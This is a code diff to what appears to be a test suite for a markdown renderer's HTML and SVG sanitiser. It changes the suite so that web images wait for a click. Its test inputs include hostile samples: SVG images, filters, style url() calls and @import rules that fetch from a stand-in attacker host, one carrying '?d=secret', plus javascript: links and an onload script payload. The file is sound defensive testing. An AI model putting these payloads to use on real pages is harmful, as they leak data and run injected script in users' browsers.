@@ -77,7 +77,7 @@ const OPTIONS: [string, MarkdownOptions][] = [
       tableActions: { label: "Table", preview: "Preview", copy: "Copy table" },
       videoCards: { tip: "Preview", fallback: "Video" },
       math: true,
-      links: { imageTip: "Preview" },
+      links: { imageTip: "Preview", remoteImage: "Load" },
       paths: { tip: "Open" },
       diagrams: { streaming: false },
       lineNumbers: true,
@@ -158,7 +158,8 @@ function inspect(name: string, html: string) {
       if (key.startsWith("on")) problems.push(`${name}: emitted a handler ${key}= on <${tag}>`)
       // What can navigate or load is checked by value, not only by name.
       if (key === "href" && !/^(https?:\/\/|#md-fn)/i.test(value)) problems.push(`${name}: a link to ${value}`)
-      if (key === "src" && !/^(https?:\/\/|data:image\/(png|jpe?g|gif|webp|avif|bmp);)/i.test(value)) problems.push(`${name}: a picture from ${value}`)
+      // round 8: a web picture is never drawn straight away - it waits for a click - so only inline pictures have a src.
+      if (key === "src" && !/^data:image\/(png|jpe?g|gif|webp|avif|bmp);/i.test(value)) problems.push(`${name}: a picture from ${value}`)
       if (key === "data-fallback-href" && !/^https?:\/\//i.test(value)) problems.push(`${name}: a fallback link to ${value}`)
       if (key === "style" && /url\(|expression|javascript:|@import/i.test(value)) problems.push(`${name}: a style that loads or runs: ${value}`)
     }
@@ -198,9 +199,18 @@ const SVG_CASES: [string, string, RegExp][] = [
   ["a javascript: link", '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>', /javascript:/i],
   ["a javascript: xlink", "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>", /javascript:/i],
   ["a data: use", '<svg><use href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/></svg>', /href\s*=\s*"data:/i],
+  // round 8: a drawing never fetches from the web on its own.
+  ["a web image", '<svg><image href="https://evil.example/p.png?d=secret" /></svg>', /evil\.example/i],
+  ["a protocol-relative xlink image", "<svg><image xlink:href='//evil.example/p.png' /></svg>", /evil\.example/i],
+  ["a web feImage", '<svg><filter><feImage href=https://evil.example/x /></filter></svg>', /evil\.example/i],
+  ["a web url() in a style", '<svg><rect style="fill:url(https://evil.example/x#p)" /></svg>', /evil\.example/i],
+  ["a web @import", "<svg><style>@import url(https://evil.example/a.css);</style></svg>", /evil\.example/i],
 ]
 for (const [name, source, hazard] of SVG_CASES) {
   if (hazard.test(stripSvgHazards(source))) problems.push(`the svg pre-pass let through ${name}`)
+}
+if (!/href="https:\/\/example\.com"/.test(stripSvgHazards('<svg><a href="https://example.com"><text>x</text></a></svg>'))) {
+  problems.push("the svg pre-pass removed an ordinary link, which only a click follows")
 }
 if (!/foreignObject/.test(stripSvgHazards("<svg><foreignObject><div>x</div></foreignObject></svg>", true))) {
   problems.push("the svg pre-pass removed mermaid's foreignObject labels")
@@ -246,8 +256,10 @@ const shape: [string, string, RegExp, MarkdownOptions?][] = [
   ["a relative link keeps its words", "[docs](docs/a.md)", /^<p class="md-p">docs<\/p>$/, REPLY],
   ["a footnote", "said[^1]\n\n[^1]: the note", /said<sup class="md-fnref"><a class="md-fnref-link" href="#md-fn-1" data-footnote-ref="1">1<\/a><\/sup>[\s\S]*<section class="md-footnotes" data-footnotes><ol><li data-footnote="1">the note/, REPLY],
   // Pictures.
-  ["a picture", "![a cat](https://example.com/cat.png)", /<img class="md-img" src="https:\/\/example\.com\/cat\.png" alt="a cat"/, REPLY],
-  ["a picture link", "[cat](https://example.com/cat.png)", /<img class="md-img md-img-link" [^>]*data-fallback-href="https:\/\/example\.com\/cat\.png"/, REPLY],
+  // round 8: a web picture waits for a click, so it is a placeholder naming where it would load from.
+  ["a picture", "![a cat](https://example.com/cat.png)", /<button type="button" class="md-img-remote" data-remote-src="https:\/\/example\.com\/cat\.png" data-remote-alt="a cat"[^>]*>[\s\S]*example\.com<\/span><\/button>/, REPLY],
+  ["a picture link", "[cat](https://example.com/cat.png)", /<button type="button" class="md-img-remote md-img-link" [^>]*data-fallback-href="https:\/\/example\.com\/cat\.png"/, REPLY],
+  ["an inline picture still shows at once", "![dot](data:image/png;base64,iVBORw0KGgo=)", /<img class="md-img" src="data:image\/png;base64,iVBORw0KGgo="/, REPLY],
   ["a local picture by path", "![](/tmp/shot.png)", /<span class="md-media" data-media="image" data-media-path="\/tmp\/shot\.png">/, REPLY],
   // Paths.
   ["an absolute file", "`/Users/me/report.pdf`", /<code class="md-path" role="button" tabindex="0" data-path="\/Users\/me\/report\.pdf" data-path-kind="open" title="Open">/, REPLY],
